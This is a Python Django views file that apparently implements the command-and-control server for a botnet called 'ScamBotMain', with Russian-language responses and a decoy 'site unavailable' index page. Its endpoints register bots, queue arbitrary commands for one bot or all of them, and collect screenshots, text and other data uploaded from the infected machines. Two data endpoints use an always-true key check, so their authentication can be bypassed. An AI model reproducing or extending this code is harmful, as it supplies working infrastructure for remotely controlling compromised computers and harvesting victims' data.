import os
from datetime import datetime, timedelta
from django.http import HttpResponse, JsonResponse, Http404
from django.utils.datetime_safe import datetime
from django.views.decorators.csrf import csrf_exempt
from ScamBotMain.models import Bots

bot_key = os.environ['bot_key']
adm_key = os.environ['adm_key']


def index(request):
    return HttpResponse("Sorry the site is currently unavailable. Please try again later")


@csrf_exempt
def add_bot(request):
    if request.method == 'POST':
        content = request.POST.dict()
        if content['key'] == bot_key:
            bots = Bots.objects.all()
            for i in range(len(bots)):
                if content['bot_id'] != bots[i].bot_id:
                    continue
                else:
                    return JsonResponse({'success': False, 'message': 'Ошибка! Бот уже присутствует в базе данных'})
            Bots.objects.create(bot_id=content['bot_id'])
            return JsonResponse({'success': True, 'message': 'Успех! Бот был добавлен в базу данных'})
        else:
            return JsonResponse({'success': False,
                                 'message': 'Не удалось выполнить команду, проверьте правильность отправленных данных'})
    else:
        raise Http404()


@csrf_exempt
def check_bots(request):
    if request.method == 'POST':
        content = request.POST.dict()
        if content['key'] == adm_key:
            check_bots_time()
            bots_query = Bots.objects.all()
            bots = []
            for i in range(len(bots_query)):
                bots.append(str(bots_query[i].bot_id))
            if len(bots) == 0:
                return JsonResponse({'success': False, 'message': 'В базе данных нет ботов'})
            else:
                return JsonResponse({'success': True, 'message': 'Вот список ботов', 'bots': bots})
        else:
            return JsonResponse({'success': False,
                                 'message': 'Не удалось обработать запрос, проверьте правильность отправленных данных'})
    else:
        raise Http404()


def check_bots_time():
    current_time = datetime.now()
    current_time_minus = current_time - timedelta(minutes=5)
    current_time_plus = current_time + timedelta(minutes=5)
    Bots.objects.filter(last_activity__lte=current_time_minus.time()).delete()
    Bots.objects.filter(last_activity__gte=current_time_plus.time()).delete()


@csrf_exempt
def get_command(request):
    if request.method == 'POST':
        content = request.POST.dict()
        if content['key'] == bot_key:
            update_bot_time(content['bot_id'])
            check_bots_time()
            if Bots.objects.get(bot_id=content['bot_id']).command_added:
                return JsonResponse({'success': True,
                                     'message': 'Вот команда',
                                     'command': Bots.objects.get(bot_id=content['bot_id']).command})
            else:
                return JsonResponse({'success': False, 'message': 'Команды нет'})
        else:
            return JsonResponse({'success': False,
                                 'message': 'Не удалось обработать запрос, проверьте правильность отправленных данных'})
    else:
        raise Http404()


def update_bot_time(bot_id):
    Bots.objects.filter(bot_id=bot_id).update(last_activity=str(datetime.now().time()))


@csrf_exempt
def add_command(request):
    if request.method == 'POST':
        content = request.POST.dict()
        if content['key'] == adm_key:
            if content['bot_id'] == 'ALL':
                Bots.objects.all().update(command=content['command'])
                Bots.objects.all().update(command_added=True)
                return JsonResponse({'success': True, 'message': 'Команда была успешно добавлена'})
            else:
                Bots.objects.filter(bot_id=content['bot_id']).update(command=content['command'])
                Bots.objects.filter(bot_id=content['bot_id']).update(command_added=True)
                return JsonResponse({'success': True, 'message': 'Команда была успешно добавлена'})
        else:
            return JsonResponse({'success': False,
                                 'message': 'Не удалось обработать запрос, проверьте правильность отправленных данных'})
    else:
        raise Http404()


@csrf_exempt
def del_command(request):
    if request.method == 'POST':
        content = request.POST.dict()
        if content['key'] == adm_key:
            if content['bot_id'] == 'ALL':
                Bots.objects.all().update(command='')
                Bots.objects.all().update(command_added=False)
                return JsonResponse({'success': True, 'message': 'Команда была успешно удалена'})
            else:
                Bots.objects.filter(bot_id=content['bot_id']).update(command='')
                Bots.objects.filter(bot_id=content['bot_id']).update(command_added=False)
                return JsonResponse({'success': True, 'message': 'Команда была успешно удалена'})
        elif content['key'] == bot_key:
            Bots.objects.filter(bot_id=content['bot_id']).update(command='')
            Bots.objects.filter(bot_id=content['bot_id']).update(command_added=False)
            return JsonResponse({'success': True, 'message': 'Команда была успешно удалена'})
        else:
            return JsonResponse({'success': False,
                                 'message': 'Не удалось обработать запрос, проверьте правильность отправленных данных'})
    else:
        raise Http404()


@csrf_exempt
def add_other_data(request):
    if request.method == 'POST':
        content = request.POST.dict()
        if content['key'] == bot_key or adm_key:
            if content['bot_id'] == 'ALL':
                if 'screenshot' in content:
                    Bots.objects.all().update(screenshot=content['screenshot'])
                    return JsonResponse({'success': True, 'message': 'Дополнительные данные были успешно отправлены'})
                elif 'website' in content:
                    Bots.objects.all().update(website=content['website'])
                    return JsonResponse({'success': True, 'message': 'Дополнительные данные были успешно отправлены'})
                elif 'image' in content:
                    Bots.objects.all().update(image=content['image'])
                    return JsonResponse({'success': True, 'message': 'Дополнительные данные были успешно отправлены'})
                elif 'text' in content:
                    Bots.objects.all().update(text=content['text'])
                    Bots.objects.filter(bot_id=content['bot_id']).update(text=content['text'])
                    return JsonResponse({'success': True, 'message': 'Дополнительные данные были успешно отправлены'})
                elif 'info' in content:
                    Bots.objects.all().update(info=content['info'])
                    Bots.objects.filter(bot_id=content['bot_id']).update(info=content['info'])
                    return JsonResponse({'success': True, 'message': 'Дополнительные данные были успешно отправлены'})
                else:
                    return JsonResponse({'success': False,
                                         'message': 'Не удалось обработать запрос, проверьте '
                                                    'правильность отправленных данных'})
            else:
                if 'screenshot' in content:
                    Bots.objects.filter(bot_id=content['bot_id']).update(screenshot=content['screenshot'])
                    return JsonResponse({'success': True, 'message': 'Дополнительные данные были успешно отправлены'})
                elif 'website' in content:
                    Bots.objects.filter(bot_id=content['bot_id']).update(website=content['website'])
                    return JsonResponse({'success': True, 'message': 'Дополнительные данные были успешно отправлены'})
                elif 'image' in content:
                    Bots.objects.filter(bot_id=content['bot_id']).update(image=content['image'])
                    return JsonResponse({'success': True, 'message': 'Дополнительные данные были успешно отправлены'})
                elif 'text' in content:
                    Bots.objects.filter(bot_id=content['bot_id']).update(text=content['text'])
                    return JsonResponse({'success': True, 'message': 'Дополнительные данные были успешно отправлены'})
                elif 'info' in content:
                    Bots.objects.filter(bot_id=content['bot_id']).update(info=content['info'])
                    return JsonResponse({'success': True, 'message': 'Дополнительные данные были успешно отправлены'})
    else:
        raise Http404()


@csrf_exempt
def get_other_data(request):
    if request.method == 'POST':
        content = request.POST.dict()
        if content['key'] == bot_key or adm_key:
            if content['required'] == 'screenshot':
                if content["bot_id"] == "ALL":
                    bots = Bots.objects.all()
                    screenshot = []
                    for i in range(len(bots)):
                        if bots[i].screenshot == '':
                            continue
                        else:
                            screenshot.append(bots[i].screenshot)
                            Bots.objects.filter(bot_id=bots[i].bot_id).update(screenshot='')
                else:
                    screenshot = Bots.objects.get(bot_id=content['bot_id']).screenshot
                    Bots.objects.filter(bot_id=content['bot_id']).update(screenshot='')
                if len(screenshot) == 0:
                    return JsonResponse({'success': False, 'message': 'Ошибка! Данные не были загружены'})
                else:
                    return JsonResponse({'success': True,
                                         'message': 'Успех! Данные получены',
                                         'screenshot': screenshot})
            elif content['required'] == 'website':
                website = Bots.objects.get(bot_id=content['bot_id']).website
                Bots.objects.filter(bot_id=content['bot_id']).update(website='')
                if website == '':
                    return JsonResponse({'success': False, 'message': 'Ошибка! Данные не были загружены'})
                else:
                    return JsonResponse({'success': True,
                                         'message': 'Успех! Данные получены',
                                         'website': website})
            elif content['required'] == 'image':
                image = Bots.objects.get(bot_id=content['bot_id']).image
                Bots.objects.filter(bot_id=content['bot_id']).update(image='')
                if image == '':
                    return JsonResponse({'success': False, 'message': 'Ошибка! Данные не были загружены'})
                else:
                    return JsonResponse({'success': True,
                                         'message': 'Успех! Данные получены',
                                         'image': image})
            elif content['required'] == 'text':
                text = Bots.objects.get(bot_id=content['bot_id']).text
                Bots.objects.filter(bot_id=content['bot_id']).update(text='')
                if text == '':
                    return JsonResponse({'success': False, 'message': 'Ошибка! Данные не были загружены'})
                else:
                    return JsonResponse({'success': True,
                                         'message': 'Успех! Данные получены',
                                         'text': text})
            elif content['required'] == 'info':
                if content["bot_id"] == "ALL":
                    bots = Bots.objects.all()
                    info = []
                    for i in range(len(bots)):
                        if bots[i].info == '':
                            continue
                        else:
                            info.append(bots[i].info)
                            Bots.objects.filter(bot_id=bots[i].bot_id).update(info='')
                else:
                    info = Bots.objects.get(bot_id=content['bot_id']).info
                    Bots.objects.filter(bot_id=content['bot_id']).update(info='')
                if len(info) == 0:
                    return JsonResponse({'success': False, 'message': 'Ошибка! Данные не были загружены'})
                else:
                    return JsonResponse({'success': True,
                                         'message': 'Успех! Данные получены',
                                         'info': info})
        else:
            return JsonResponse({'success': False,
                                 'message': 'Не удалось обработать запрос, проверьте правильность отправленных данных'})
    else:
        raise Http404()
